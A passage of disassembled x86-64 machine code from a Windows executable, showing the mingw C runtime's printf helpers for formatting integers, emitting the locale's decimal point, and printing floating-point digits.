   14000466c:	49 b9 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r9
   140004673:	cc cc cc 
   140004676:	41 81 e2 00 10 00 00 	and    $0x1000,%r10d
   14000467d:	0f 1f 00             	nopl   (%rax)
   140004680:	4d 39 c4             	cmp    %r8,%r12
   140004683:	74 2b                	je     1400046b0 <__pformat_int.isra.0+0xd0>
   140004685:	45 85 d2             	test   %r10d,%r10d
   140004688:	74 26                	je     1400046b0 <__pformat_int.isra.0+0xd0>
   14000468a:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   14000468f:	74 1f                	je     1400046b0 <__pformat_int.isra.0+0xd0>
   140004691:	4c 89 c0             	mov    %r8,%rax
   140004694:	4c 29 e0             	sub    %r12,%rax
   140004697:	4c 21 d8             	and    %r11,%rax
   14000469a:	48 83 f8 03          	cmp    $0x3,%rax
   14000469e:	75 10                	jne    1400046b0 <__pformat_int.isra.0+0xd0>
   1400046a0:	41 c6 00 2c          	movb   $0x2c,(%r8)
   1400046a4:	49 83 c0 01          	add    $0x1,%r8
   1400046a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400046af:	00 
   1400046b0:	48 89 c8             	mov    %rcx,%rax
   1400046b3:	4d 8d 68 01          	lea    0x1(%r8),%r13
   1400046b7:	49 f7 e1             	mul    %r9
   1400046ba:	48 89 c8             	mov    %rcx,%rax
   1400046bd:	48 c1 ea 03          	shr    $0x3,%rdx
   1400046c1:	4c 8d 3c 92          	lea    (%rdx,%rdx,4),%r15
   1400046c5:	4d 01 ff             	add    %r15,%r15
   1400046c8:	4c 29 f8             	sub    %r15,%rax
   1400046cb:	83 c0 30             	add    $0x30,%eax
   1400046ce:	41 88 00             	mov    %al,(%r8)
   1400046d1:	48 83 f9 09          	cmp    $0x9,%rcx
   1400046d5:	76 09                	jbe    1400046e0 <__pformat_int.isra.0+0x100>
   1400046d7:	48 89 d1             	mov    %rdx,%rcx
   1400046da:	4d 89 e8             	mov    %r13,%r8
   1400046dd:	eb a1                	jmp    140004680 <__pformat_int.isra.0+0xa0>
   1400046df:	90                   	nop
   1400046e0:	45 85 f6             	test   %r14d,%r14d
   1400046e3:	0f 8e 47 01 00 00    	jle    140004830 <__pformat_int.isra.0+0x250>
   1400046e9:	4c 89 e8             	mov    %r13,%rax
   1400046ec:	45 89 f7             	mov    %r14d,%r15d
   1400046ef:	4c 29 e0             	sub    %r12,%rax
   1400046f2:	41 29 c7             	sub    %eax,%r15d
   1400046f5:	45 85 ff             	test   %r15d,%r15d
   1400046f8:	0f 8e 02 01 00 00    	jle    140004800 <__pformat_int.isra.0+0x220>
   1400046fe:	4d 63 c7             	movslq %r15d,%r8
   140004701:	41 83 ef 01          	sub    $0x1,%r15d
   140004705:	4c 89 e9             	mov    %r13,%rcx
   140004708:	ba 30 00 00 00       	mov    $0x30,%edx
   14000470d:	e8 d6 4c 00 00       	call   1400093e8 <memset>
   140004712:	4d 63 ff             	movslq %r15d,%r15
   140004715:	4f 8d 6c 3d 01       	lea    0x1(%r13,%r15,1),%r13
   14000471a:	4d 39 ec             	cmp    %r13,%r12
   14000471d:	0f 84 e6 00 00 00    	je     140004809 <__pformat_int.isra.0+0x229>
   140004723:	85 f6                	test   %esi,%esi
   140004725:	7e 43                	jle    14000476a <__pformat_int.isra.0+0x18a>
   140004727:	4c 89 e8             	mov    %r13,%rax
   14000472a:	4c 29 e0             	sub    %r12,%rax
   14000472d:	29 c6                	sub    %eax,%esi
   14000472f:	89 73 0c             	mov    %esi,0xc(%rbx)
   140004732:	85 f6                	test   %esi,%esi
   140004734:	7e 34                	jle    14000476a <__pformat_int.isra.0+0x18a>
   140004736:	f7 c7 c0 01 00 00    	test   $0x1c0,%edi
   14000473c:	74 06                	je     140004744 <__pformat_int.isra.0+0x164>
   14000473e:	83 ee 01             	sub    $0x1,%esi
   140004741:	89 73 0c             	mov    %esi,0xc(%rbx)
   140004744:	45 85 f6             	test   %r14d,%r14d
   140004747:	79 12                	jns    14000475b <__pformat_int.isra.0+0x17b>
   140004749:	89 f8                	mov    %edi,%eax
   14000474b:	25 00 06 00 00       	and    $0x600,%eax
   140004750:	3d 00 02 00 00       	cmp    $0x200,%eax
   140004755:	0f 84 f0 01 00 00    	je     14000494b <__pformat_int.isra.0+0x36b>
   14000475b:	81 e7 00 04 00 00    	and    $0x400,%edi
   140004761:	0f 84 0e 01 00 00    	je     140004875 <__pformat_int.isra.0+0x295>
   140004767:	8b 7b 08             	mov    0x8(%rbx),%edi
   14000476a:	40 f6 c7 80          	test   $0x80,%dil
   14000476e:	0f 84 a4 01 00 00    	je     140004918 <__pformat_int.isra.0+0x338>
   140004774:	41 c6 45 00 2d       	movb   $0x2d,0x0(%r13)
   140004779:	49 8d 75 01          	lea    0x1(%r13),%rsi
   14000477d:	49 39 f4             	cmp    %rsi,%r12
   140004780:	72 2a                	jb     1400047ac <__pformat_int.isra.0+0x1cc>
   140004782:	e9 1a 01 00 00       	jmp    1400048a1 <__pformat_int.isra.0+0x2c1>
   140004787:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000478e:	00 00 
   140004790:	48 63 43 24          	movslq 0x24(%rbx),%rax
   140004794:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140004797:	8b 43 24             	mov    0x24(%rbx),%eax
   14000479a:	83 c0 01             	add    $0x1,%eax
   14000479d:	89 43 24             	mov    %eax,0x24(%rbx)
   1400047a0:	49 39 f4             	cmp    %rsi,%r12
   1400047a3:	0f 84 f8 00 00 00    	je     1400048a1 <__pformat_int.isra.0+0x2c1>
   1400047a9:	8b 7b 08             	mov    0x8(%rbx),%edi
   1400047ac:	48 83 ee 01          	sub    $0x1,%rsi
   1400047b0:	f7 c7 00 40 00 00    	test   $0x4000,%edi
   1400047b6:	75 08                	jne    1400047c0 <__pformat_int.isra.0+0x1e0>
   1400047b8:	8b 43 24             	mov    0x24(%rbx),%eax
   1400047bb:	39 43 28             	cmp    %eax,0x28(%rbx)
   1400047be:	7e da                	jle    14000479a <__pformat_int.isra.0+0x1ba>
   1400047c0:	81 e7 00 20 00 00    	and    $0x2000,%edi
   1400047c6:	0f be 0e             	movsbl (%rsi),%ecx
   1400047c9:	48 8b 13             	mov    (%rbx),%rdx
   1400047cc:	74 c2                	je     140004790 <__pformat_int.isra.0+0x1b0>
   1400047ce:	e8 dd 4b 00 00       	call   1400093b0 <fputc>
   1400047d3:	8b 43 24             	mov    0x24(%rbx),%eax
   1400047d6:	eb c2                	jmp    14000479a <__pformat_int.isra.0+0x1ba>
   1400047d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400047df:	00 
   1400047e0:	89 c2                	mov    %eax,%edx
   1400047e2:	41 b8 ab aa aa aa    	mov    $0xaaaaaaab,%r8d
   1400047e8:	49 0f af d0          	imul   %r8,%rdx
   1400047ec:	48 c1 ea 21          	shr    $0x21,%rdx
   1400047f0:	01 d0                	add    %edx,%eax
   1400047f2:	e9 27 fe ff ff       	jmp    14000461e <__pformat_int.isra.0+0x3e>
   1400047f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400047fe:	00 00 
   140004800:	4d 39 ec             	cmp    %r13,%r12
   140004803:	0f 85 1a ff ff ff    	jne    140004723 <__pformat_int.isra.0+0x143>
   140004809:	41 c6 45 00 30       	movb   $0x30,0x0(%r13)
   14000480e:	49 83 c5 01          	add    $0x1,%r13
   140004812:	e9 0c ff ff ff       	jmp    140004723 <__pformat_int.isra.0+0x143>
   140004817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000481e:	00 00 
   140004820:	48 f7 d9             	neg    %rcx
   140004823:	e9 34 fe ff ff       	jmp    14000465c <__pformat_int.isra.0+0x7c>
   140004828:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000482f:	00 
   140004830:	4d 39 ec             	cmp    %r13,%r12
   140004833:	0f 85 ea fe ff ff    	jne    140004723 <__pformat_int.isra.0+0x143>
   140004839:	45 85 f6             	test   %r14d,%r14d
   14000483c:	75 cb                	jne    140004809 <__pformat_int.isra.0+0x229>
   14000483e:	85 f6                	test   %esi,%esi
   140004840:	0f 8e 24 ff ff ff    	jle    14000476a <__pformat_int.isra.0+0x18a>
   140004846:	89 73 0c             	mov    %esi,0xc(%rbx)
   140004849:	f7 c7 c0 01 00 00    	test   $0x1c0,%edi
   14000484f:	0f 85 2c 01 00 00    	jne    140004981 <__pformat_int.isra.0+0x3a1>
   140004855:	81 e7 00 04 00 00    	and    $0x400,%edi
   14000485b:	0f 85 06 ff ff ff    	jne    140004767 <__pformat_int.isra.0+0x187>
   140004861:	83 6b 0c 01          	subl   $0x1,0xc(%rbx)
   140004865:	0f 1f 00             	nopl   (%rax)
   140004868:	48 89 da             	mov    %rbx,%rdx
   14000486b:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004870:	e8 3b f3 ff ff       	call   140003bb0 <__pformat_putc>
   140004875:	8b 43 0c             	mov    0xc(%rbx),%eax
   140004878:	8d 50 ff             	lea    -0x1(%rax),%edx
   14000487b:	89 53 0c             	mov    %edx,0xc(%rbx)
   14000487e:	85 c0                	test   %eax,%eax
   140004880:	7f e6                	jg     140004868 <__pformat_int.isra.0+0x288>
   140004882:	e9 e0 fe ff ff       	jmp    140004767 <__pformat_int.isra.0+0x187>
   140004887:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000488e:	00 00 
   140004890:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   140004894:	c6 04 10 20          	movb   $0x20,(%rax,%rdx,1)
   140004898:	8b 43 24             	mov    0x24(%rbx),%eax
   14000489b:	83 c0 01             	add    $0x1,%eax
   14000489e:	89 43 24             	mov    %eax,0x24(%rbx)
   1400048a1:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400048a4:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400048a7:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400048aa:	85 c0                	test   %eax,%eax
   1400048ac:	7e 32                	jle    1400048e0 <__pformat_int.isra.0+0x300>
   1400048ae:	8b 53 08             	mov    0x8(%rbx),%edx
   1400048b1:	f6 c6 40             	test   $0x40,%dh
   1400048b4:	75 08                	jne    1400048be <__pformat_int.isra.0+0x2de>
   1400048b6:	8b 43 24             	mov    0x24(%rbx),%eax
   1400048b9:	39 43 28             	cmp    %eax,0x28(%rbx)
   1400048bc:	7e dd                	jle    14000489b <__pformat_int.isra.0+0x2bb>
   1400048be:	48 8b 03             	mov    (%rbx),%rax
   1400048c1:	80 e6 20             	and    $0x20,%dh
   1400048c4:	74 ca                	je     140004890 <__pformat_int.isra.0+0x2b0>
   1400048c6:	48 89 c2             	mov    %rax,%rdx
   1400048c9:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400048ce:	e8 dd 4a 00 00       	call   1400093b0 <fputc>
   1400048d3:	8b 43 24             	mov    0x24(%rbx),%eax
   1400048d6:	eb c3                	jmp    14000489b <__pformat_int.isra.0+0x2bb>
   1400048d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400048df:	00 
   1400048e0:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   1400048e4:	5b                   	pop    %rbx
   1400048e5:	5e                   	pop    %rsi
   1400048e6:	5f                   	pop    %rdi
   1400048e7:	41 5c                	pop    %r12
   1400048e9:	41 5d                	pop    %r13
   1400048eb:	41 5e                	pop    %r14
   1400048ed:	41 5f                	pop    %r15
   1400048ef:	5d                   	pop    %rbp
   1400048f0:	c3                   	ret
   1400048f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400048f8:	4d 89 e5             	mov    %r12,%r13
   1400048fb:	45 89 f7             	mov    %r14d,%r15d
   1400048fe:	45 85 f6             	test   %r14d,%r14d
   140004901:	0f 8f f7 fd ff ff    	jg     1400046fe <__pformat_int.isra.0+0x11e>
   140004907:	0f 85 fc fe ff ff    	jne    140004809 <__pformat_int.isra.0+0x229>
   14000490d:	85 f6                	test   %esi,%esi
   14000490f:	0f 8f 31 ff ff ff    	jg     140004846 <__pformat_int.isra.0+0x266>
   140004915:	0f 1f 00             	nopl   (%rax)
   140004918:	f7 c7 00 01 00 00    	test   $0x100,%edi
   14000491e:	74 10                	je     140004930 <__pformat_int.isra.0+0x350>
   140004920:	41 c6 45 00 2b       	movb   $0x2b,0x0(%r13)
   140004925:	49 8d 75 01          	lea    0x1(%r13),%rsi
   140004929:	e9 4f fe ff ff       	jmp    14000477d <__pformat_int.isra.0+0x19d>
   14000492e:	66 90                	xchg   %ax,%ax
   140004930:	4c 89 ee             	mov    %r13,%rsi
   140004933:	40 f6 c7 40          	test   $0x40,%dil
   140004937:	0f 84 40 fe ff ff    	je     14000477d <__pformat_int.isra.0+0x19d>
   14000493d:	41 c6 45 00 20       	movb   $0x20,0x0(%r13)
   140004942:	48 83 c6 01          	add    $0x1,%rsi
   140004946:	e9 32 fe ff ff       	jmp    14000477d <__pformat_int.isra.0+0x19d>
   14000494b:	8b 43 0c             	mov    0xc(%rbx),%eax
   14000494e:	8b 7b 08             	mov    0x8(%rbx),%edi
   140004951:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004954:	89 53 0c             	mov    %edx,0xc(%rbx)
   140004957:	85 c0                	test   %eax,%eax
   140004959:	0f 8e 0b fe ff ff    	jle    14000476a <__pformat_int.isra.0+0x18a>
   14000495f:	48 63 f0             	movslq %eax,%rsi
   140004962:	4c 89 e9             	mov    %r13,%rcx
   140004965:	ba 30 00 00 00       	mov    $0x30,%edx
   14000496a:	49 89 f0             	mov    %rsi,%r8
   14000496d:	49 01 f5             	add    %rsi,%r13
   140004970:	e8 73 4a 00 00       	call   1400093e8 <memset>
   140004975:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   14000497c:	e9 e9 fd ff ff       	jmp    14000476a <__pformat_int.isra.0+0x18a>
   140004981:	83 ee 01             	sub    $0x1,%esi
   140004984:	89 73 0c             	mov    %esi,0xc(%rbx)
   140004987:	e9 cf fd ff ff       	jmp    14000475b <__pformat_int.isra.0+0x17b>
   14000498c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140004990 <__pformat_emit_radix_point>:
   140004990:	55                   	push   %rbp
   140004991:	41 54                	push   %r12
   140004993:	57                   	push   %rdi
   140004994:	56                   	push   %rsi
   140004995:	53                   	push   %rbx
   140004996:	48 83 ec 30          	sub    $0x30,%rsp
   14000499a:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000499f:	83 79 14 fd          	cmpl   $0xfffffffd,0x14(%rcx)
   1400049a3:	48 89 cb             	mov    %rcx,%rbx
   1400049a6:	0f 84 d4 00 00 00    	je     140004a80 <__pformat_emit_radix_point+0xf0>
   1400049ac:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   1400049b0:	66 85 d2             	test   %dx,%dx
   1400049b3:	0f 84 a7 00 00 00    	je     140004a60 <__pformat_emit_radix_point+0xd0>
   1400049b9:	48 63 43 14          	movslq 0x14(%rbx),%rax
   1400049bd:	48 89 e7             	mov    %rsp,%rdi
   1400049c0:	48 83 c0 0f          	add    $0xf,%rax
   1400049c4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400049c8:	e8 23 f0 ff ff       	call   1400039f0 <___chkstk_ms>
   1400049cd:	48 29 c4             	sub    %rax,%rsp
   1400049d0:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   1400049d4:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   1400049db:	00 
   1400049dc:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   1400049e1:	48 89 f1             	mov    %rsi,%rcx
   1400049e4:	e8 c7 44 00 00       	call   140008eb0 <wcrtomb>
   1400049e9:	85 c0                	test   %eax,%eax
   1400049eb:	0f 8e cf 00 00 00    	jle    140004ac0 <__pformat_emit_radix_point+0x130>
   1400049f1:	83 e8 01             	sub    $0x1,%eax
   1400049f4:	4c 8d 64 06 01       	lea    0x1(%rsi,%rax,1),%r12
   1400049f9:	eb 1a                	jmp    140004a15 <__pformat_emit_radix_point+0x85>
   1400049fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a00:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   140004a04:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   140004a07:	8b 43 24             	mov    0x24(%rbx),%eax
   140004a0a:	83 c0 01             	add    $0x1,%eax
   140004a0d:	89 43 24             	mov    %eax,0x24(%rbx)
   140004a10:	49 39 f4             	cmp    %rsi,%r12
   140004a13:	74 36                	je     140004a4b <__pformat_emit_radix_point+0xbb>
   140004a15:	8b 53 08             	mov    0x8(%rbx),%edx
   140004a18:	48 83 c6 01          	add    $0x1,%rsi
   140004a1c:	f6 c6 40             	test   $0x40,%dh
   140004a1f:	75 08                	jne    140004a29 <__pformat_emit_radix_point+0x99>
   140004a21:	8b 43 24             	mov    0x24(%rbx),%eax
   140004a24:	39 43 28             	cmp    %eax,0x28(%rbx)
   140004a27:	7e e1                	jle    140004a0a <__pformat_emit_radix_point+0x7a>
   140004a29:	0f be 4e ff          	movsbl -0x1(%rsi),%ecx
   140004a2d:	48 8b 03             	mov    (%rbx),%rax
   140004a30:	80 e6 20             	and    $0x20,%dh
   140004a33:	74 cb                	je     140004a00 <__pformat_emit_radix_point+0x70>
   140004a35:	48 89 c2             	mov    %rax,%rdx
   140004a38:	e8 73 49 00 00       	call   1400093b0 <fputc>
   140004a3d:	8b 43 24             	mov    0x24(%rbx),%eax
   140004a40:	83 c0 01             	add    $0x1,%eax
   140004a43:	89 43 24             	mov    %eax,0x24(%rbx)
   140004a46:	49 39 f4             	cmp    %rsi,%r12
   140004a49:	75 ca                	jne    140004a15 <__pformat_emit_radix_point+0x85>
   140004a4b:	48 89 fc             	mov    %rdi,%rsp
   140004a4e:	48 89 ec             	mov    %rbp,%rsp
   140004a51:	5b                   	pop    %rbx
   140004a52:	5e                   	pop    %rsi
   140004a53:	5f                   	pop    %rdi
   140004a54:	41 5c                	pop    %r12
   140004a56:	5d                   	pop    %rbp
   140004a57:	c3                   	ret
   140004a58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004a5f:	00 
   140004a60:	48 89 da             	mov    %rbx,%rdx
   140004a63:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140004a68:	e8 43 f1 ff ff       	call   140003bb0 <__pformat_putc>
   140004a6d:	90                   	nop
   140004a6e:	48 89 ec             	mov    %rbp,%rsp
   140004a71:	5b                   	pop    %rbx
   140004a72:	5e                   	pop    %rsi
   140004a73:	5f                   	pop    %rdi
   140004a74:	41 5c                	pop    %r12
   140004a76:	5d                   	pop    %rbp
   140004a77:	c3                   	ret
   140004a78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004a7f:	00 
   140004a80:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   140004a87:	00 
   140004a88:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   140004a8c:	e8 37 49 00 00       	call   1400093c8 <localeconv>
   140004a91:	48 8d 4d f6          	lea    -0xa(%rbp),%rcx
   140004a95:	49 89 f1             	mov    %rsi,%r9
   140004a98:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140004a9e:	48 8b 10             	mov    (%rax),%rdx
   140004aa1:	e8 9a 46 00 00       	call   140009140 <mbrtowc>
   140004aa6:	85 c0                	test   %eax,%eax
   140004aa8:	7e 2e                	jle    140004ad8 <__pformat_emit_radix_point+0x148>
   140004aaa:	0f b7 55 f6          	movzwl -0xa(%rbp),%edx
   140004aae:	66 89 53 18          	mov    %dx,0x18(%rbx)
   140004ab2:	89 43 14             	mov    %eax,0x14(%rbx)
   140004ab5:	e9 f6 fe ff ff       	jmp    1400049b0 <__pformat_emit_radix_point+0x20>
   140004aba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004ac0:	48 89 da             	mov    %rbx,%rdx
   140004ac3:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140004ac8:	e8 e3 f0 ff ff       	call   140003bb0 <__pformat_putc>
   140004acd:	48 89 fc             	mov    %rdi,%rsp
   140004ad0:	e9 79 ff ff ff       	jmp    140004a4e <__pformat_emit_radix_point+0xbe>
   140004ad5:	0f 1f 00             	nopl   (%rax)
   140004ad8:	0f b7 53 18          	movzwl 0x18(%rbx),%edx
   140004adc:	eb d4                	jmp    140004ab2 <__pformat_emit_radix_point+0x122>
   140004ade:	66 90                	xchg   %ax,%ax

0000000140004ae0 <__pformat_emit_float>:
   140004ae0:	55                   	push   %rbp
   140004ae1:	57                   	push   %rdi
   140004ae2:	56                   	push   %rsi
   140004ae3:	53                   	push   %rbx
   140004ae4:	48 83 ec 28          	sub    $0x28,%rsp
   140004ae8:	41 8b 41 0c          	mov    0xc(%r9),%eax
   140004aec:	89 cd                	mov    %ecx,%ebp
   140004aee:	48 89 d7             	mov    %rdx,%rdi
   140004af1:	44 89 c6             	mov    %r8d,%esi
   140004af4:	4c 89 cb             	mov    %r9,%rbx
   140004af7:	45 85 c0             	test   %r8d,%r8d
   140004afa:	0f 8e d8 01 00 00    	jle    140004cd8 <__pformat_emit_float+0x1f8>
   140004b00:	41 39 c0             	cmp    %eax,%r8d
   140004b03:	0f 8f 1f 01 00 00    	jg     140004c28 <__pformat_emit_float+0x148>
   140004b09:	41 8b 51 10          	mov    0x10(%r9),%edx
   140004b0d:	44 29 c0             	sub    %r8d,%eax
   140004b10:	39 d0                	cmp    %edx,%eax
   140004b12:	0f 8f e8 02 00 00    	jg     140004e00 <__pformat_emit_float+0x320>
   140004b18:	41 c7 41 0c ff ff ff 	movl   $0xffffffff,0xc(%r9)
   140004b1f:	ff 
   140004b20:	41 8b 51 08          	mov    0x8(%r9),%edx
   140004b24:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004b29:	80 e6 10             	and    $0x10,%dh
   140004b2c:	0f 84 ce 01 00 00    	je     140004d00 <__pformat_emit_float+0x220>
   140004b32:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140004b37:	0f 84 c3 01 00 00    	je     140004d00 <__pformat_emit_float+0x220>
   140004b3d:	8d 56 02             	lea    0x2(%rsi),%edx
   140004b40:	41 b8 ab aa aa aa    	mov    $0xaaaaaaab,%r8d
   140004b46:	89 c1                	mov    %eax,%ecx
   140004b48:	49 0f af d0          	imul   %r8,%rdx
   140004b4c:	48 c1 ea 21          	shr    $0x21,%rdx
   140004b50:	83 fa 01             	cmp    $0x1,%edx
   140004b53:	0f 84 a7 01 00 00    	je     140004d00 <__pformat_emit_float+0x220>
   140004b59:	83 ea 01             	sub    $0x1,%edx
   140004b5c:	89 c8                	mov    %ecx,%eax
   140004b5e:	29 ca                	sub    %ecx,%edx
   140004b60:	eb 16                	jmp    140004b78 <__pformat_emit_float+0x98>
   140004b62:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004b68:	83 e8 01             	sub    $0x1,%eax
   140004b6b:	89 d1                	mov    %edx,%ecx
   140004b6d:	01 c1                	add    %eax,%ecx
   140004b6f:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004b72:	0f 84 88 01 00 00    	je     140004d00 <__pformat_emit_float+0x220>
   140004b78:	85 c0                	test   %eax,%eax
   140004b7a:	7f ec                	jg     140004b68 <__pformat_emit_float+0x88>
   140004b7c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004b80:	85 ed                	test   %ebp,%ebp
   140004b82:	0f 85 d0 01 00 00    	jne    140004d58 <__pformat_emit_float+0x278>
   140004b88:	8b 53 08             	mov    0x8(%rbx),%edx
   140004b8b:	f6 c6 01             	test   $0x1,%dh
   140004b8e:	0f 85 2c 02 00 00    	jne    140004dc0 <__pformat_emit_float+0x2e0>
   140004b94:	83 e2 40             	and    $0x40,%edx
   140004b97:	74 17                	je     140004bb0 <__pformat_emit_float+0xd0>
   140004b99:	48 89 da             	mov    %rbx,%rdx
   140004b9c:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004ba1:	e8 0a f0 ff ff       	call   140003bb0 <__pformat_putc>
   140004ba6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004bad:	00 00 00 
   140004bb0:	8b 43 0c             	mov    0xc(%rbx),%eax
   140004bb3:	85 c0                	test   %eax,%eax
   140004bb5:	7e 15                	jle    140004bcc <__pformat_emit_float+0xec>
   140004bb7:	8b 53 08             	mov    0x8(%rbx),%edx
   140004bba:	81 e2 00 06 00 00    	and    $0x600,%edx
   140004bc0:	81 fa 00 02 00 00    	cmp    $0x200,%edx
   140004bc6:	0f 84 0c 02 00 00    	je     140004dd8 <__pformat_emit_float+0x2f8>
   140004bcc:	85 f6                	test   %esi,%esi
   140004bce:	0f 8e 9c 01 00 00    	jle    140004d70 <__pformat_emit_float+0x290>
   140004bd4:	0f 1f 40 00          	nopl   0x0(%rax)
   140004bd8:	0f b6 07             	movzbl (%rdi),%eax
   140004bdb:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004be0:	84 c0                	test   %al,%al
   140004be2:	74 07                	je     140004beb <__pformat_emit_float+0x10b>
   140004be4:	48 83 c7 01          	add    $0x1,%rdi
   140004be8:	0f be c8             	movsbl %al,%ecx
   140004beb:	48 89 da             	mov    %rbx,%rdx
   140004bee:	e8 bd ef ff ff       	call   140003bb0 <__pformat_putc>
   140004bf3:	83 ee 01             	sub    $0x1,%esi
   140004bf6:	74 78                	je     140004c70 <__pformat_emit_float+0x190>
   140004bf8:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
   140004bfc:	74 da                	je     140004bd8 <__pformat_emit_float+0xf8>
   140004bfe:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140004c03:	74 d3                	je     140004bd8 <__pformat_emit_float+0xf8>
   140004c05:	69 c6 ab aa aa aa    	imul   $0xaaaaaaab,%esi,%eax
   140004c0b:	3d 55 55 55 55       	cmp    $0x55555555,%eax
   140004c10:	77 c6                	ja     140004bd8 <__pformat_emit_float+0xf8>
   140004c12:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
   140004c16:	49 89 d8             	mov    %rbx,%r8
   140004c19:	ba 01 00 00 00       	mov    $0x1,%edx
   140004c1e:	e8 ed ef ff ff       	call   140003c10 <__pformat_wputchars>
   140004c23:	eb b3                	jmp    140004bd8 <__pformat_emit_float+0xf8>
   140004c25:	0f 1f 00             	nopl   (%rax)
   140004c28:	41 c7 41 0c ff ff ff 	movl   $0xffffffff,0xc(%r9)
   140004c2f:	ff 
   140004c30:	41 f6 41 09 10       	testb  $0x10,0x9(%r9)
   140004c35:	0f 84 45 ff ff ff    	je     140004b80 <__pformat_emit_float+0xa0>
   140004c3b:	66 41 83 79 20 00    	cmpw   $0x0,0x20(%r9)
   140004c41:	0f 84 39 ff ff ff    	je     140004b80 <__pformat_emit_float+0xa0>
   140004c47:	41 8d 50 02          	lea    0x2(%r8),%edx
   140004c4b:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
   140004c50:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004c55:	48 0f af d0          	imul   %rax,%rdx
   140004c59:	48 c1 ea 21          	shr    $0x21,%rdx
   140004c5d:	83 fa 01             	cmp    $0x1,%edx
   140004c60:	0f 85 f3 fe ff ff    	jne    140004b59 <__pformat_emit_float+0x79>
   140004c66:	e9 15 ff ff ff       	jmp    140004b80 <__pformat_emit_float+0xa0>
   140004c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c70:	8b 43 10             	mov    0x10(%rbx),%eax
   140004c73:	85 c0                	test   %eax,%eax
   140004c75:	7f 19                	jg     140004c90 <__pformat_emit_float+0x1b0>
   140004c77:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   140004c7b:	75 13                	jne    140004c90 <__pformat_emit_float+0x1b0>
   140004c7d:	83 e8 01             	sub    $0x1,%eax
   140004c80:	89 43 10             	mov    %eax,0x10(%rbx)
   140004c83:	48 83 c4 28          	add    $0x28,%rsp
   140004c87:	5b                   	pop    %rbx
   140004c88:	5e                   	pop    %rsi
   140004c89:	5f                   	pop    %rdi
   140004c8a:	5d                   	pop    %rbp
   140004c8b:	c3                   	ret
   140004c8c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004c90:	48 89 d9             	mov    %rbx,%rcx
   140004c93:	e8 f8 fc ff ff       	call   140004990 <__pformat_emit_radix_point>
   140004c98:	eb 21                	jmp    140004cbb <__pformat_emit_float+0x1db>
   140004c9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004ca0:	0f b6 07             	movzbl (%rdi),%eax
   140004ca3:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004ca8:	84 c0                	test   %al,%al
   140004caa:	74 07                	je     140004cb3 <__pformat_emit_float+0x1d3>
   140004cac:	48 83 c7 01          	add    $0x1,%rdi
   140004cb0:	0f be c8             	movsbl %al,%ecx
   140004cb3:	48 89 da             	mov    %rbx,%rdx
   140004cb6:	e8 f5 ee ff ff       	call   140003bb0 <__pformat_putc>
   140004cbb:	8b 43 10             	mov    0x10(%rbx),%eax
   140004cbe:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004cc1:	89 53 10             	mov    %edx,0x10(%rbx)
   140004cc4:	85 c0                	test   %eax,%eax
   140004cc6:	7f d8                	jg     140004ca0 <__pformat_emit_float+0x1c0>
   140004cc8:	48 83 c4 28          	add    $0x28,%rsp
   140004ccc:	5b                   	pop    %rbx
   140004ccd:	5e                   	pop    %rsi
